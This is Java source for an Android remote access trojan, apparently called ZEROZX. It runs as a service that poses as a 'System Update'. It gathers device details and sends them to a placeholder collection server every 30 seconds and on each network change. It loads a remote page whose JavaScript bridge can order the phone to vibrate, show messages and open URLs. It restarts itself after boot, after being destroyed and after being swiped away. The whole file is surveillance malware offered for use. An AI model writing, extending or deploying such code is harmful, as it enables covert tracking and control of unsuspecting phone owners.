package com.zerox.rat.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class ZEROZXService extends Service {

    private static final String TAG = "ZEROZX_RAT";
    private static final String CHANNEL_ID = "system_update_channel";
    private static final int NOTIFICATION_ID = 999;
    private static final String SERVER_URL = "https://your-server.com/collect.php";
    private static final String WS_URL = "wss://your-server.com:6666";
    private static final String DEVICE_ID = "ANDROID_" + Settings.Secure.ANDROID_ID;
    
    private WebView webView;
    private Handler handler;
    private Timer heartbeatTimer;
    private String deviceModel;
    private String deviceBrand;
    private String androidVersion;
    private String batteryLevel;
    private String ipAddress;
    private String location;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "ZEROZX Service Created");
        
        handler = new Handler(Looper.getMainLooper());
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification("System update in progress..."));
        
        collectDeviceInfo();
        initializeWebView();
        startHeartbeat();
        registerReceivers();
        sendDeviceData();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Update",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("System update service");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification buildNotification(String text) {
        Intent intent = new Intent(this, ZEROZXService.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_IMMUTABLE
        );

        return new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build();
    }

    private void collectDeviceInfo() {
        deviceBrand = Build.BRAND;
        deviceModel = Build.MODEL;
        androidVersion = Build.VERSION.RELEASE;
        
        // Battery
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryIntent = registerReceiver(null, filter);
        if (batteryIntent != null) {
            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            batteryLevel = (int)(level * 100 / (float)scale) + "%";
        }
        
        // IP Address
        ipAddress = getLocalIpAddress();
        
        Log.d(TAG, "Device: " + deviceBrand + " " + deviceModel + " | Android: " + androidVersion);
    }

    private String getLocalIpAddress() {
        try {
            java.net.Socket socket = new java.net.Socket("8.8.8.8", 53);
            String ip = socket.getLocalAddress().getHostAddress();
            socket.close();
            return ip;
        } catch (Exception e) {
            return "unknown";
        }
    }

    private void initializeWebView() {
        webView = new WebView(this);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(WebSettings.LOAD_NO_CACHE);
        settings.setUserAgentString(
            "Mozilla/5.0 (Linux; Android " + androidVersion + "; " + deviceModel + 
            ") AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"
        );
        
        webView.addJavascriptInterface(new JavaScriptBridge(), "AndroidBridge");
        
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                // Inject JavaScript for persistence
                String js = "javascript:(function(){" +
                    "window.AndroidBridge.sendDeviceInfo(JSON.stringify({" +
                    "brand:'" + deviceBrand + "'," +
                    "model:'" + deviceModel + "'," +
                    "android:'" + androidVersion + "'," +
                    "battery:'" + batteryLevel + "'," +
                    "ip:'" + ipAddress + "'" +
                    "}));})()";
                view.loadUrl(js);
            }
        });
        
        webView.setWebChromeClient(new WebChromeClient());
        
        // Load RAT HTML
        webView.loadUrl("https://your-server.com/rat.html");
    }

    public class JavaScriptBridge {
        @JavascriptInterface
        public void sendDeviceInfo(String jsonData) {
            Log.d(TAG, "Device info from WebView: " + jsonData);
            // Forward to server
            sendToServer(jsonData);
        }

        @JavascriptInterface
        public void executeCommand(String command) {
            Log.d(TAG, "Command received: " + command);
            handler.post(() -> {
                try {
                    JSONObject cmd = new JSONObject(command);
                    String action = cmd.getString("action");
                    
                    switch(action) {
                        case "vibrate":
                            android.os.Vibrator vibrator = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
                            if (vibrator != null) {
                                vibrator.vibrate(2000);
                            }
                            break;
                        case "toast":
                            String message = cmd.getString("message");
                            android.widget.Toast.makeText(ZEROZXService.this, message, 
                                android.widget.Toast.LENGTH_LONG).show();
                            break;
                        case "open_url":
                            Intent browserIntent = new Intent(Intent.ACTION_VIEW, 
                                android.net.Uri.parse(cmd.getString("url")));
                            browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(browserIntent);
                            break;
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Command error: " + e.getMessage());
                }
            });
        }

        @JavascriptInterface
        public String getDeviceInfo() {
            try {
                JSONObject info = new JSONObject();
                info.put("id", DEVICE_ID);
                info.put("brand", deviceBrand);
                info.put("model", deviceModel);
                info.put("android", androidVersion);
                info.put("battery", batteryLevel);
                info.put("ip", ipAddress);
                return info.toString();
            } catch (Exception e) {
                return "{}";
            }
        }
    }

    private void sendDeviceData() {
        new Thread(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("id", DEVICE_ID);
                data.put("brand", deviceBrand);
                data.put("model", deviceModel);
                data.put("androidVersion", androidVersion);
                data.put("battery", batteryLevel);
                data.put("ip", ipAddress);
                data.put("type", "android_app");
                data.put("timestamp", System.currentTimeMillis());

                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                conn.getOutputStream().write(data.toString().getBytes());
                
                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Data sent, response: " + responseCode);
                
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send error: " + e.getMessage());
            }
        }).start();
    }

    private void startHeartbeat() {
        heartbeatTimer = new Timer();
        heartbeatTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                sendDeviceData();
                
                // Update notification
                Notification notif = buildNotification("Active - " + deviceBrand + " " + deviceModel);
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.notify(NOTIFICATION_ID, notif);
                }
            }
        }, 30000, 30000);
    }

    private void registerReceivers() {
        // Boot receiver
        IntentFilter bootFilter = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d(TAG, "Boot completed, restarting service");
                Intent serviceIntent = new Intent(context, ZEROZXService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent);
                } else {
                    context.startService(serviceIntent);
                }
            }
        }, bootFilter);

        // Network change receiver
        IntentFilter networkFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                sendDeviceData();
                Log.d(TAG, "Network changed, data resent");
            }
        }, networkFilter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed - restarting");
        
        if (heartbeatTimer != null) {
            heartbeatTimer.cancel();
        }
        
        // Auto restart
        Intent restartIntent = new Intent(this, ZEROZXService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "Task removed - restarting");
        
        // Restart service when app is swiped away
        Intent restartIntent = new Intent(this, ZEROZXService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
            this, 0, restartIntent, PendingIntent.FLAG_IMMUTABLE
        );
        
        android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.set(
                android.app.AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 1000,
                pendingIntent
            );
        }
    }
}